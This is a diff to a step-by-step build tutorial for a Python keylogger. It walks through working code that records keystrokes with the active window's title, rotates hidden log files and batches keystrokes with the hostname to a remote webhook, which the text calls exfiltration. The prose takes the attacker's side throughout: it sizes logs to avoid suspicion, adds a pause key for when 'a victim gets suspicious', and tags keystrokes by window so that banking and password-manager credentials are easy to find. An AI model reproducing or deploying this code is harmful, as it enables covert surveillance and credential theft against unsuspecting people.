@@ -6,16 +6,19 @@ This document walks through the actual code. We'll build key features step by st
 
 ```
 keylogger/
-├── keylogger.py          # 440 lines, complete implementation
-│   ├── Imports (1-54)    # Dependencies and platform detection
-│   ├── Enums (57-62)     # KeyType classification
-│   ├── Config (64-82)    # KeyloggerConfig dataclass
-│   ├── Models (84-107)   # KeyEvent dataclass
-│   ├── WindowTracker (121-165)  # Platform window detection
-│   ├── LogManager (168-218)     # File persistence
-│   ├── WebhookDelivery (221-263) # Remote exfiltration
-│   └── Keylogger (293-424)       # Main controller
-├── test_keylogger.py     # 186 lines, component tests
+├── keylogger.py          # 550 lines, complete implementation
+│   ├── Imports (1-31)    # Dependencies and platform detection
+│   ├── Platform constants + conditional imports (32-48)
+│   ├── Module-level constants (49-52)
+│   ├── SPECIAL_KEYS dict (75-95)
+│   ├── KeyType enum (98-104)
+│   ├── KeyloggerConfig (107-120)   # Pure data container, no side effects
+│   ├── KeyEvent (123-152)        # Keystroke record
+│   ├── WindowTracker (155-219)   # Platform window detection
+│   ├── LogManager (222-296)      # Direct file I/O with rotation
+│   ├── WebhookDelivery (298-371) # Remote exfiltration (buffer swap)
+│   └── Keylogger (373-533)       # Main controller
+├── test_keylogger.py     # 598 lines, 46 pytest tests
 └── pyproject.toml        # Dependencies and tool config
 ```
 
@@ -25,12 +28,12 @@ keylogger/
 
 What we're building: Type-safe classification of keyboard events
 
-Create the `KeyType` enum (`keylogger.py:57-62`):
+Create the `KeyType` enum (`keylogger.py:98-104`):
 
 ```python
 class KeyType(Enum):
     """
-    Enumeration of keyboard event types for type safety
+    Categorizes keystrokes as character, special, or unknown
     """
     CHAR = auto()
     SPECIAL = auto()
@@ -46,26 +49,22 @@ class KeyType(Enum):
 
 **Common mistakes here:**
 ```python
-# Wrong approach: Using magic strings
-key_type = "char"  # Typos like "cahrs" won't be caught
+key_type = "char"
 
-# Why this fails: No IDE autocomplete, no type checking, easy to mistype
-
-# Good: Enum ensures type safety
-key_type = KeyType.CHAR  # IDE autocompletes, type checker validates
+key_type = KeyType.CHAR
 ```
 
 ### Step 2: Configuring Behavior with Dataclasses
 
 Now we need centralized configuration that's easy to read and modify.
 
-In `keylogger.py` (lines 64-82):
+In `keylogger.py` (lines 107-120):
 
 ```python
 @dataclass
 class KeyloggerConfig:
     """
-    Configuration for keylogger behavior
+    Runtime configuration for keylogger behavior
     """
     log_dir: Path = Path.home() / ".keylogger_logs"
     log_file_prefix: str = "keylog"
@@ -75,19 +74,17 @@ class KeyloggerConfig:
     toggle_key: Key = Key.f9
     enable_window_tracking: bool = True
     log_special_keys: bool = True
-
-    def __post_init__(self):
-        self.log_dir.mkdir(parents=True, exist_ok=True)
+    window_check_interval: float = WINDOW_CHECK_INTERVAL_SECS
 ```
 
 **What's happening:**
 1. `@dataclass` decorator generates `__init__`, `__repr__`, and equality methods automatically
 2. Type hints (`Path`, `str | None`, `float`) document expected types and enable static analysis
 3. Default values let you customize only what you need: `KeyloggerConfig(max_log_size_mb=1.0)`
-4. `__post_init__` runs after `__init__` and creates the log directory if it doesn't exist
+4. `window_check_interval` defaults to the module-level constant `WINDOW_CHECK_INTERVAL_SECS` (0.5 seconds), making the polling rate configurable per instance
 
 **Why we do it this way:**
-Dataclasses reduce boilerplate from ~20 lines of `__init__` code to 2 lines of decorator. Type hints catch bugs during development (mypy will complain if you pass `max_log_size_mb="five"` instead of `5.0`). Default values make the config self-documenting about reasonable settings.
+KeyloggerConfig is a pure data container with no side effects on construction. Directory creation happens later in LogManager, not here. This means you can freely create config objects for testing or comparison without touching the filesystem. Dataclasses reduce boilerplate from ~20 lines of `__init__` code to 2 lines of decorator. Type hints catch bugs during development (mypy will complain if you pass `max_log_size_mb="five"` instead of `5.0`). Default values make the config self-documenting about reasonable settings.
 
 **Alternative approaches:**
 - Dictionary: `config = {"log_dir": Path.home() / ".keylogger_logs"}` works but has no type safety and keys can be mistyped
@@ -96,7 +93,7 @@ Dataclasses reduce boilerplate from ~20 lines of `__init__` code to 2 lines of d
 
 ### Step 3: Representing Keyboard Events
 
-In `keylogger.py` (lines 84-107):
+In `keylogger.py` (lines 123-152):
 
 ```python
 @dataclass
@@ -111,22 +108,22 @@ class KeyEvent:
 
     def to_dict(self) -> dict[str, str]:
         """
-        Convert event to dictionary for JSON serialization
+        Convert event to dictionary for serialization
         """
         return {
             "timestamp": self.timestamp.isoformat(),
             "key": self.key,
             "window_title": self.window_title or "Unknown",
-            "key_type": self.key_type.name.lower()
+            "key_type": self.key_type.name.lower(),
         }
 
     def to_log_string(self) -> str:
         """
-        Format event as human readable log string
+        Format event as human readable log line
         """
         time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
-        window_info = f" [{self.window_title}]" if self.window_title else ""
-        return f"[{time_str}]{window_info} {self.key}"
+        window = f" [{self.window_title}]" if self.window_title else ""
+        return f"[{time_str}]{window} {self.key}"
 ```
 
 **Key parts explained:**
@@ -154,12 +151,12 @@ Abstract platform differences behind a unified interface. Detect the OS once, ca
 
 ### Implementation
 
-In `keylogger.py` (lines 121-165):
+In `keylogger.py` (lines 155-219):
 
 ```python
 class WindowTracker:
     """
-    Tracks active window titles across different operating systems
+    Active window title lookup across OS platforms
     """
     @staticmethod
     def get_active_window() -> str | None:
@@ -168,28 +165,30 @@ class WindowTracker:
         """
         system = platform.system()
 
-        if system == "Windows" and win32gui:
+        if system == WINDOWS and win32gui:
             return WindowTracker._get_windows_window()
-        if system == "Darwin" and NSWorkspace:
+        if system == DARWIN and NSWorkspace:
             return WindowTracker._get_macos_window()
-        if system == "Linux":
+        if system == LINUX:
             return WindowTracker._get_linux_window()
 
         return None
 ```
 
-This public method hides platform complexity. Callers just invoke `WindowTracker.get_active_window()` and get back a string or None regardless of OS.
+This public method hides platform complexity. Callers just invoke `WindowTracker.get_active_window()` and get back a string or None regardless of OS. The comparisons use module-level constants (`WINDOWS`, `DARWIN`, `LINUX`) defined at line 53 instead of raw strings, eliminating magic string repetition.
 
-**Windows implementation** (`keylogger.py:140-150`):
+**Windows implementation** (`keylogger.py:175-186`):
 ```python
 @staticmethod
 def _get_windows_window() -> str | None:
     try:
-        window = win32gui.GetForegroundWindow()
-        _, pid = win32process.GetWindowThreadProcessId(window)
+        hwnd = win32gui.GetForegroundWindow()
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
         process = psutil.Process(pid)
-        window_title = win32gui.GetWindowText(window)
-        return f"{process.name()} - {window_title}" if window_title else process.name()
+        title = win32gui.GetWindowText(hwnd)
+        if title:
+            return f"{process.name()} - {title}"
+        return process.name()
     except Exception:
         return None
 ```
@@ -201,18 +200,18 @@ def _get_windows_window() -> str | None:
 - We combine process name and window title: "chrome.exe - Gmail"
 - Broad exception catching is intentional because window tracking is optional, failure shouldn't crash the keylogger
 
-**macOS implementation** (`keylogger.py:152-158`):
+**macOS implementation** (`keylogger.py:188-199`):
 ```python
 @staticmethod
 def _get_macos_window() -> str | None:
     try:
-        active_app = NSWorkspace.sharedWorkspace().activeApplication()
-        return active_app.get('NSApplicationName', 'Unknown')
+        active = NSWorkspace.sharedWorkspace().activeApplication()
+        return active.get('NSApplicationName', 'Unknown')
     except Exception:
         return None
 ```
 
-**Linux implementation** (`keylogger.py:160-172`):
+**Linux implementation** (`keylogger.py:201-219`):
 ```python
 @staticmethod
 def _get_linux_window() -> str | None:
@@ -222,14 +221,16 @@ def _get_linux_window() -> str | None:
             capture_output=True,
             text=True,
             timeout=1,
-            check=False
+            check=False,
         )
-        return result.stdout.strip() if result.returncode == 0 else None
+        if result.returncode == 0:
+            return result.stdout.strip()
+        return None
     except Exception:
         return None
 ```
 
-This shells out to xdotool command-line utility. We set `timeout=1` to avoid hanging if xdotool is slow. `check=False` means non-zero exit codes don't raise exceptions.
+This shells out to xdotool command-line utility. The `subprocess` module is imported at the top of the file (line 27), not conditionally inside the Linux branch. We set `timeout=1` to avoid hanging if xdotool is slow. `check=False` means non-zero exit codes don't raise exceptions.
 
 ### Testing This Feature
 
@@ -240,103 +241,121 @@ from keylogger import WindowTracker
 
 title = WindowTracker.get_active_window()
 print(f"Active window: {title}")
-# Output: "chrome.exe - GitHub" (Windows)
-# Output: "Google Chrome" (macOS)
-# Output: "GitHub — Mozilla Firefox" (Linux)
 ```
 
 If you see None, check that platform-specific dependencies are installed. Windows needs pywin32, macOS needs PyObjC, Linux needs xdotool.
 
 ## Building the Log Manager
 
-### Step 1: File Creation and Rotation
+### Step 1: Direct File I/O with Rotation
 
-What we're building: Persistent logging with automatic file rotation
+What we're building: Persistent logging with automatic file rotation using direct file writes
 
-Create `LogManager` class (`keylogger.py:168-218`):
+Create `LogManager` class (`keylogger.py:222-296`):
 
 ```python
 class LogManager:
     """
-    Manages log file rotation and writing
+    File writer with automatic size-based rotation
     """
     def __init__(self, config: KeyloggerConfig):
         self.config = config
+        config.log_dir.mkdir(parents=True, exist_ok=True)
         self.current_log_path = self._get_new_log_path()
-        self.lock = Lock()
-        self.logger = self._setup_logger()
+        self._lock = Lock()
+        self._file = open(self.current_log_path, 'a', encoding='utf-8')
 ```
 
 The `Lock()` from threading module prevents race conditions. Multiple threads (keyboard listener thread, main thread) might write simultaneously. Without the lock, log files could get corrupted with interleaved writes.
 
-**Setting up Python logging** (`keylogger.py:175-182`):
+Notice that `LogManager.__init__` creates the log directory (`config.log_dir.mkdir(...)`) rather than KeyloggerConfig doing it. This keeps configuration as a pure data container with no side effects on construction.
+
+**Generating log file paths** (`keylogger.py:240-246`):
 ```python
-def _setup_logger(self) -> logging.Logger:
-    logger = logging.getLogger("keylogger")
-    logger.setLevel(logging.INFO)
-
-    handler = logging.FileHandler(self.current_log_path)
-    handler.setFormatter(logging.Formatter('%(message)s'))
-    logger.addHandler(handler)
-
-    return logger
+def _get_new_log_path(self) -> Path:
+    """
+    Generate a new log file path with timestamp
+    """
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
+    name = f"{self.config.log_file_prefix}_{ts}.txt"
+    return self.config.log_dir / name
 ```
 
-We use Python's logging module instead of direct file writes because it handles buffering efficiently. The `Formatter('%(message)s')` means we only write the message without timestamps (we add those in `KeyEvent.to_log_string()`).
+The `%f` format code includes microseconds, producing filenames like `keylog_20250131_143500_123456.txt`. This prevents collisions when rotation happens within the same second.
 
 ### Step 2: Writing Events Thread-Safely
 
-In `keylogger.py` (lines 184-189):
+In `keylogger.py` (lines 248-255):
 
 ```python
 def write_event(self, event: KeyEvent) -> None:
     """
     Write a keyboard event to the log file
     """
-    with self.lock:
-        self.logger.info(event.to_log_string())
+    with self._lock:
+        self._file.write(event.to_log_string() + '\n')
+        self._file.flush()
         self._check_rotation()
 ```
 
-The `with self.lock:` acquires the lock, executes the indented code, then releases the lock automatically. This is safer than manual `lock.acquire()` and `lock.release()` because it guarantees the lock gets released even if an exception occurs.
+The `with self._lock:` acquires the lock, executes the indented code, then releases the lock automatically. This is safer than manual `lock.acquire()` and `lock.release()` because it guarantees the lock gets released even if an exception occurs.
+
+LogManager uses direct file I/O (`self._file.write()` and `self._file.flush()`) rather than Python's `logging` module. This gives full control over flushing and rotation without the overhead of log formatters, handlers, and the logging hierarchy.
 
 **What NOT to do:**
 ```python
-# Bad: No synchronization
 def write_event(self, event):
-    self.logger.info(event.to_log_string())
+    self._file.write(event.to_log_string() + '\n')
     self._check_rotation()
-
-# Why this fails: Two threads writing simultaneously can corrupt the file
-# Thread 1 writes "[2025-01-31 14:30:22]"
-# Thread 2 writes "[2025-01-31 14:30:22]" at same time
-# Result: "[2025-01-[2025-01-31 14:30:22]31 14:30:22]" (corrupted)
 ```
+
+Two threads writing simultaneously can corrupt the file. Thread 1 writes `"[2025-01-31 14:30:22]"`, Thread 2 writes `"[2025-01-31 14:30:22]"` at same time, and the result is `"[2025-01-[2025-01-31 14:30:22]31 14:30:22]"` (corrupted).
 
 ### Step 3: Automatic File Rotation
 
-In `keylogger.py` (lines 191-208):
+In `keylogger.py` (lines 257-280):
 
 ```python
 def _check_rotation(self) -> None:
     """
-    Check if log rotation is needed based on file size
+    Rotate log file when size limit is reached
     """
-    current_size_mb = self.current_log_path.stat().st_size / (1024 * 1024)
+    try:
+        size = self.current_log_path.stat().st_size
+    except FileNotFoundError:
+        self._rotate()
+        return
 
-    if current_size_mb >= self.config.max_log_size_mb:
-        self.logger.handlers[0].close()
-        self.logger.removeHandler(self.logger.handlers[0])
+    if size / BYTES_PER_MB >= self.config.max_log_size_mb:
+        self._rotate()
 
-        self.current_log_path = self._get_new_log_path()
-        handler = logging.FileHandler(self.current_log_path)
-        handler.setFormatter(logging.Formatter('%(message)s'))
-        self.logger.addHandler(handler)
+def _rotate(self) -> None:
+    """
+    Close current log file and open a new one
+    """
+    self._file.close()
+    self.current_log_path = self._get_new_log_path()
+    self._file = open(self.current_log_path, 'a', encoding='utf-8')
 ```
 
-This checks file size after every write. When it exceeds `max_log_size_mb` (default 5.0), we close the current file and create a new one. The old file remains on disk with all historical keystrokes.
+This checks file size after every write. When it exceeds `max_log_size_mb` (default 5.0), we close the current file handle and open a new one. The `BYTES_PER_MB` constant (1024 * 1024) avoids a magic number in the division. If the log file was deleted externally (caught by `FileNotFoundError`), we also rotate to a fresh file.
 
 Why 5MB default? Large enough to capture significant activity (5MB of text is ~5 million characters, weeks or months of typing). Small enough to avoid suspicion (a 500MB keylog file screams malware).
+
+### Step 4: Closing the File Handle
+
+In `keylogger.py` (lines 290-296):
+
+```python
+def close(self) -> None:
+    """
+    Close the underlying file handle
+    """
+    with self._lock:
+        self._file.close()
+```
+
+The Keylogger's `stop()` method calls `self.log_manager.close()` during shutdown to release the file handle cleanly. This ensures all buffered data is flushed and the OS file descriptor is freed.
 
 ## Building Webhook Delivery
 
@@ -344,12 +363,12 @@ Why 5MB default? Large enough to capture significant activity (5MB of text is ~5
 
 What we're building: Remote exfiltration that minimizes network noise
 
-Create `WebhookDelivery` class (`keylogger.py:221-263`):
+Create `WebhookDelivery` class (`keylogger.py:298-371`):
 
 ```python
 class WebhookDelivery:
     """
-    Handles batched delivery of logs to remote webhook
+    Batched HTTP delivery of events to a remote endpoint
     """
     def __init__(self, config: KeyloggerConfig):
         self.config = config
@@ -360,74 +379,78 @@ class WebhookDelivery:
 
 The `enabled` flag is True only if both `webhook_url` is set AND the requests library imported successfully. This handles cases where requests isn't installed gracefully.
 
-**Adding events to buffer** (`keylogger.py:222-232`):
+**Adding events to buffer** (`keylogger.py:308-324`):
 ```python
 def add_event(self, event: KeyEvent) -> None:
     """
-    Add event to buffer and deliver if batch size reached
+    Buffer an event and deliver when batch is full
     """
     if not self.enabled:
         return
 
+    batch: list[KeyEvent] | None = None
     with self.buffer_lock:
         self.event_buffer.append(event)
-
         if len(self.event_buffer) >= self.config.webhook_batch_size:
-            self._deliver_batch()
+            batch = self.event_buffer
+            self.event_buffer = []
+
+    if batch:
+        self._deliver_batch(batch)
 ```
 
-Events accumulate in the buffer. When we hit the batch size (default 50), we send them all at once. This reduces network calls from potentially thousands per minute (fast typer) to maybe 10-20 per minute.
+This uses a **buffer swap pattern**: when the batch is full, we swap `self.event_buffer` with a fresh empty list inside the lock, then deliver the old batch *outside* the lock. This means the HTTP POST (which is slow) never blocks other threads from adding events to the buffer. Events accumulate in the buffer. When we hit the batch size (default 50), we send them all at once. This reduces network calls from potentially thousands per minute (fast typer) to maybe 10-20 per minute.
 
-**Delivering the batch** (`keylogger.py:234-255`):
+**Delivering the batch** (`keylogger.py:326-357`):
 ```python
-def _deliver_batch(self) -> None:
+def _deliver_batch(self, events: list[KeyEvent]) -> None:
     """
-    Deliver buffered events to webhook endpoint
+    POST buffered events to the webhook endpoint
     """
-    if not self.event_buffer or not self.config.webhook_url:
+    if not events or not self.config.webhook_url:
         return
 
     payload = {
         "timestamp": datetime.now().isoformat(),
         "host": platform.node(),
-        "events": [event.to_dict() for event in self.event_buffer]
+        "events": [e.to_dict() for e in events],
     }
 
     try:
         response = requests.post(
             self.config.webhook_url,
             json=payload,
-            timeout=5
+            timeout=WEBHOOK_TIMEOUT_SECS,
         )
-
-        if response.status_code == 200:
-            self.event_buffer.clear()
-    except Exception as e:
-        logging.error("Webhook delivery failed: %s", e)
+        if not response.ok:
+            logging.warning("Webhook returned %s", response.status_code)
+    except Exception:
+        logging.error("Webhook delivery failed", exc_info=True)
 ```
 
 **Why this specific handling:**
 The payload includes `platform.node()` which gives the hostname. This helps attackers track which machine the data came from if they're monitoring multiple victims. The `timestamp` shows when the batch was sent, not when individual keys were pressed (those timestamps are in each event).
 
-We clear the buffer only on successful delivery (`response.status_code == 200`). If the webhook is down or returns an error, events stay in the buffer and will be resent with the next batch. This prevents data loss.
+The `_deliver_batch` method takes an `events` parameter rather than reading from `self.event_buffer`. Because the buffer was already swapped in `add_event`, the batch is a standalone list that no other thread can modify. The method uses `response.ok` (True for any 2xx status) rather than checking for exactly `status_code == 200`, which correctly handles all success codes. The timeout uses the `WEBHOOK_TIMEOUT_SECS` constant (5 seconds) rather than a magic number.
+
+If delivery fails, we log the error but do not retry. The batch is already detached from the buffer, so those events are lost on failure. This is a deliberate tradeoff: retrying would add complexity and could cause unbounded memory growth if the webhook is permanently down.
 
 **What NOT to do:**
 ```python
-# Bad: Clear buffer before checking response
 def _deliver_batch(self):
     payload = {...}
-    self.event_buffer.clear()  # Data lost if request fails!
-    
+    self.event_buffer.clear()
+
     response = requests.post(webhook_url, json=payload)
 ```
 
-This loses keystrokes if the network is down. Better to keep events until confirmed receipt.
+This loses keystrokes if the network is down. The buffer swap pattern avoids this problem by separating the buffer management (inside the lock) from the network call (outside the lock).
 
 ## Building the Main Keylogger
 
 ### Processing Keyboard Events
 
-The core of the keylogger is the event handler (`keylogger.py:367-383`):
+The core of the keylogger is the event handler (`keylogger.py:428-458`):
 
 ```python
 def _on_press(self, key: Key | KeyCode) -> None:
@@ -452,7 +475,7 @@ def _on_press(self, key: Key | KeyCode) -> None:
         timestamp=datetime.now(),
         key=key_str,
         window_title=self._current_window,
-        key_type=key_type
+        key_type=key_type,
     )
 
     self.log_manager.write_event(event)
@@ -462,9 +485,9 @@ def _on_press(self, key: Key | KeyCode) -> None:
 This callback runs every time a key is pressed. pynput calls it from its own thread, so we need to be careful about thread safety.
 
 **Important details:**
-1. Check for toggle key first. If user presses F9, pause/resume logging and early return
+1. Check for toggle key first. If user presses the configured toggle key (default F9), pause/resume logging and early return
 2. Check if logging is active. If paused, ignore the keystroke
-3. Update active window (only if 0.5 seconds passed since last check)
+3. Update active window (only if `window_check_interval` seconds passed since last check)
 4. Convert the key to string representation
 5. Filter special keys if config says so
 6. Create KeyEvent with current timestamp
@@ -473,27 +496,17 @@ This callback runs every time a key is pressed. pynput calls it from its own thr
 
 ### Converting Keys to Strings
 
-The `_process_key` method (`keylogger.py:322-351`) handles the messy details of key conversion:
+The `_process_key` method (`keylogger.py:406-426`) handles the messy details of key conversion. It uses the module-level `SPECIAL_KEYS` dictionary (defined at lines 75-95) rather than creating a new dictionary on every call:
 
 ```python
 def _process_key(self, key: Key | KeyCode) -> tuple[str, KeyType]:
     """
     Convert key to string representation and type
     """
-    special_keys = {
-        Key.space: "[SPACE]",
-        Key.enter: "[ENTER]",
-        Key.tab: "[TAB]",
-        Key.backspace: "[BACKSPACE]",
-        Key.delete: "[DELETE]",
-        Key.shift: "[SHIFT]",
-        Key.shift_r: "[SHIFT]",
-        # ... more mappings
-    }
-
     if isinstance(key, Key):
-        if key in special_keys:
-            return special_keys[key], KeyType.SPECIAL
+        label = SPECIAL_KEYS.get(key)
+        if label:
+            return label, KeyType.SPECIAL
         return f"[{key.name.upper()}]", KeyType.SPECIAL
 
     if hasattr(key, 'char') and key.char:
@@ -504,13 +517,38 @@ def _process_key(self, key: Key | KeyCode) -> tuple[str, KeyType]:
 
 pynput gives us two types: `Key` for special keys (Enter, Shift, arrows) and `KeyCode` for character keys (a, 1, !). We check with `isinstance(key, Key)` to determine which path to take.
 
-For special keys, we look them up in the dictionary. Space becomes "[SPACE]", Enter becomes "[ENTER]". This makes logs readable: you can see when someone pressed Enter to submit a form.
+For special keys, we look them up in `SPECIAL_KEYS`. Space becomes "[SPACE]", Enter becomes "[ENTER]". Keys not in the dictionary get a generic `[KEY_NAME]` format. This makes logs readable: you can see when someone pressed Enter to submit a form.
 
 For character keys, we extract the `char` attribute. This is just "a" for the A key, "1" for the 1 key, etc.
 
+The `SPECIAL_KEYS` dictionary is defined once at module scope to avoid recreating it on every keystroke:
+
+```python
+SPECIAL_KEYS: dict[Key, str] = {
+    Key.space: "[SPACE]",
+    Key.enter: "[ENTER]",
+    Key.tab: "[TAB]",
+    Key.backspace: "[BACKSPACE]",
+    Key.delete: "[DELETE]",
+    Key.shift: "[SHIFT]",
+    Key.shift_r: "[SHIFT]",
+    Key.ctrl: "[CTRL]",
+    Key.ctrl_r: "[CTRL]",
+    Key.alt: "[ALT]",
+    Key.alt_r: "[ALT]",
+    Key.cmd: "[CMD]",
+    Key.cmd_r: "[CMD]",
+    Key.esc: "[ESC]",
+    Key.up: "[UP]",
+    Key.down: "[DOWN]",
+    Key.left: "[LEFT]",
+    Key.right: "[RIGHT]",
+}
+```
+
 ### Starting and Stopping
 
-The lifecycle management (`keylogger.py:395-424`):
+The lifecycle management (`keylogger.py:479-533`):
 
 ```python
 def start(self) -> None:
@@ -518,7 +556,6 @@ def start(self) -> None:
     Start the keylogger
     """
     print("Keylogger Started")
-    # ... status output ...
 
     self.is_running.set()
     self.is_logging.set()
@@ -528,7 +565,7 @@ def start(self) -> None:
 
     try:
         while self.is_running.is_set():
-            self.listener.join(timeout=1.0)
+            self.listener.join(timeout=LISTENER_JOIN_TIMEOUT_SECS)
     except KeyboardInterrupt:
         self.stop()
 
@@ -545,6 +582,7 @@ def stop(self) -> None:
         self.listener.stop()
 
     self.webhook.flush()
+    self.log_manager.close()
 
     print(f"[*] Logs saved to: {self.config.log_dir}")
     print("[*] Keylogger stopped.")
@@ -552,44 +590,47 @@ def stop(self) -> None:
 
 We create a `keyboard.Listener` and pass our `_on_press` method as the callback. When we call `listener.start()`, pynput creates a new thread that monitors keyboard events.
 
-The `while self.is_running.is_set():` loop keeps the main thread alive. We join with timeout so we can check for Ctrl+C. Without this loop, the program would exit immediately after starting the listener.
+The `while self.is_running.is_set():` loop keeps the main thread alive. We join with the `LISTENER_JOIN_TIMEOUT_SECS` constant so we can check for Ctrl+C. Without this loop, the program would exit immediately after starting the listener.
 
-On shutdown, we call `webhook.flush()` to send any remaining buffered events. This ensures data isn't lost when the program exits.
+On shutdown, we call `webhook.flush()` to send any remaining buffered events, then `log_manager.close()` to release the file handle. This ensures data isn't lost and OS resources are freed when the program exits.
 
 ## Security Implementation
 
 ### Toggle Key for Quick Pause
 
-File: `keylogger.py:386-393`
+File: `keylogger.py:460-477`
 
 ```python
 def _toggle_logging(self) -> None:
     """
-    Toggle logging on/off with F9 key
+    Toggle logging on/off with the configured key
     """
+    toggle = self.config.toggle_key.name.upper()
+
     if self.is_logging.is_set():
         self.is_logging.clear()
-        print("\n[*] Logging paused. Press F9 to resume.")
+        print(f"\n[*] Logging paused. Press {toggle} to resume.")
     else:
         self.is_logging.set()
-        print("\n[*] Logging resumed. Press F9 to pause.")
+        print(f"\n[*] Logging resumed. Press {toggle} to pause.")
 ```
 
 **What this prevents:**
-If a victim gets suspicious (maybe they see unusual disk activity or network traffic), the attacker can press F9 to pause logging. When paused, keystrokes are ignored. This reduces the chance of detection during active investigation.
+If a victim gets suspicious (maybe they see unusual disk activity or network traffic), the attacker can press the toggle key to pause logging. When paused, keystrokes are ignored. This reduces the chance of detection during active investigation.
 
 **How it works:**
 1. Every keystroke checks if it equals `config.toggle_key` (default F9)
 2. If match, call `_toggle_logging()` and return early
-3. Toggle switches the `is_logging` Event (thread-safe flag)
-4. When logging is off, `_on_press` returns immediately without processing
+3. The method reads the key name dynamically via `self.config.toggle_key.name.upper()`, so the printed message always matches the configured key (not hardcoded "F9")
+4. Toggle switches the `is_logging` Event (thread-safe flag)
+5. When logging is off, `_on_press` returns immediately without processing
 
 **What happens if you remove this:**
 The keylogger runs continuously. If a victim opens Task Manager and sees high CPU or network usage, they might investigate. Being able to pause reduces this risk.
 
 ### Window Context for Targeted Filtering
 
-File: `keylogger.py:360-362`
+File: `keylogger.py:390-404`
 
 ```python
 def _update_active_window(self) -> None:
@@ -600,7 +641,9 @@ def _update_active_window(self) -> None:
         return
 
     now = datetime.now()
-    if (now - self._last_window_check).total_seconds() >= 0.5:
+    elapsed = (now - self._last_window_check).total_seconds()
+
+    if elapsed >= self.config.window_check_interval:
         self._current_window = self.window_tracker.get_active_window()
         self._last_window_check = now
 ```
@@ -609,7 +652,7 @@ def _update_active_window(self) -> None:
 Attackers can filter logs later to find only keystrokes from banking sites, password managers, or corporate VPNs. If every logged keystroke includes `[chrome.exe - Bank of America]`, attackers quickly find credentials.
 
 **Performance optimization:**
-We cache the window title for 0.5 seconds. Calling win32gui or NSWorkspace on every keystroke (potentially hundreds per second) would kill performance. With caching, we call it ~2 times per second regardless of typing speed.
+We cache the window title for `config.window_check_interval` seconds (default 0.5 via `WINDOW_CHECK_INTERVAL_SECS`). Calling win32gui or NSWorkspace on every keystroke (potentially hundreds per second) would kill performance. With caching, we call it ~2 times per second regardless of typing speed. The interval is configurable per instance, so tests can set it to 0 for immediate updates.
 
 ## Data Flow Example
 
@@ -620,7 +663,6 @@ Let's trace a complete request through the system.
 ### Request Comes In
 
 ```python
-# Entry point: keylogger.py:367
 def _on_press(self, key):
 ```
 
@@ -628,16 +670,14 @@ At this point:
 - `key` is `KeyCode(char='p')`
 - `self.is_logging` is set (True)
 - `self._current_window` is cached from 0.3 seconds ago
-- `self.log_manager` has a file open at `/home/user/.keylogger_logs/keylog_20250131_143022.txt`
+- `self.log_manager` has a file open at `/home/user/.keylogger_logs/keylog_20250131_143022_654321.txt`
 - `self.webhook.event_buffer` contains 47 events (not yet at batch size 50)
 
 ### Processing Layer
 
 ```python
-# Processing: keylogger.py:373-378
 key_str, key_type = self._process_key(key)
 
-# Inside _process_key (keylogger.py:347-349):
 if hasattr(key, 'char') and key.char:
     return key.char, KeyType.CHAR
 ```
@@ -652,19 +692,16 @@ Why it's structured this way: Some KeyCode objects don't have `char` set (dead k
 ### Storage/Output
 
 ```python
-# Final step: keylogger.py:379-383
 event = KeyEvent(
-    timestamp=datetime.now(),  # 2025-01-31 14:30:45.123456
+    timestamp=datetime.now(),
     key="p",
     window_title="chrome.exe - Gmail",
-    key_type=KeyType.CHAR
+    key_type=KeyType.CHAR,
 )
 
 self.log_manager.write_event(event)
-# Writes: "[2025-01-31 14:30:45][chrome.exe - Gmail] p"
 
 self.webhook.add_event(event)
-# Adds to buffer, now 48 events (still under 50)
 ```
 
 The result is a log file containing the keystroke with full context. We store it in two places: local disk (via LogManager) and in-memory buffer (via WebhookDelivery). The webhook buffer will be sent when it reaches 50 events.
@@ -676,8 +713,7 @@ The result is a log file containing the keystroke with full context. We store it
 When platform-specific modules aren't available, we handle it gracefully:
 
 ```python
-# keylogger.py:35-54
-if platform.system() == "Windows":
+if platform.system() == WINDOWS:
     try:
         import win32gui
         import win32process
@@ -687,44 +723,52 @@ if platform.system() == "Windows":
 ```
 
 **Why this specific handling:**
-If someone runs this on Windows without pywin32 installed, we set `win32gui = None`. Later, WindowTracker checks `if system == "Windows" and win32gui:` before using it. This prevents crashes and degrades gracefully (no window titles, but keystroke logging still works).
+If someone runs this on Windows without pywin32 installed, we set `win32gui = None`. Later, WindowTracker checks `if system == WINDOWS and win32gui:` before using it. This prevents crashes and degrades gracefully (no window titles, but keystroke logging still works).
+
+For the core dependency (pynput), failure is not optional. Instead of setting it to None, we re-raise as a clear error:
+
+```python
+try:
+    from pynput import keyboard
+    from pynput.keyboard import Key, KeyCode
+except ImportError as exc:
+    raise ImportError("pynput is required: uv add pynput") from exc
+```
+
+This immediately tells the user what to install, using `from exc` to preserve the original traceback for debugging.
 
 **What NOT to do:**
 ```python
-# Bad: Crash on import
-import win32gui  # ImportError kills the program
+import win32gui
 
-# Bad: Silently fail without user knowledge
 try:
     import win32gui
 except:
-    pass  # User has no idea window tracking won't work
+    pass
 ```
 
-This hides actual problems. Always set module to None on import failure so checks later can detect the absence.
+The first crashes on non-Windows. The second hides actual problems. Always set module to None on import failure so checks later can detect the absence.
 
 ### Webhook Delivery Failures
 
 ```python
-# keylogger.py:245-255
 try:
     response = requests.post(
         self.config.webhook_url,
         json=payload,
-        timeout=5
+        timeout=WEBHOOK_TIMEOUT_SECS,
     )
-    
-    if response.status_code == 200:
-        self.event_buffer.clear()
-except Exception as e:
-    logging.error("Webhook delivery failed: %s", e)
+    if not response.ok:
+        logging.warning("Webhook returned %s", response.status_code)
+except Exception:
+    logging.error("Webhook delivery failed", exc_info=True)
 ```
 
 **Important details:**
-- Timeout of 5 seconds prevents hanging indefinitely if webhook is slow
-- Only clear buffer on 200 status (success)
+- Timeout of `WEBHOOK_TIMEOUT_SECS` (5 seconds) prevents hanging indefinitely if webhook is slow
+- `response.ok` checks for any 2xx success status, not just 200
 - Broad exception catch handles network errors, DNS failures, SSL cert issues
-- Log the error message so debugging is possible
+- `exc_info=True` includes the full traceback in the log for debugging
 
 **Why it matters:**
 Production webhooks go down. Networks are unreliable. DNS can fail. Without error handling, a single network hiccup crashes the entire keylogger. With it, we log the error and continue capturing keystrokes.
@@ -734,10 +778,8 @@ Production webhooks go down. Networks are unreliable. DNS can fail. Without erro
 ### Before: Naive Window Tracking
 
 ```python
-# Bad: Call on every keystroke
 def _on_press(self, key):
     window_title = WindowTracker.get_active_window()
-    # Process key...
 ```
 
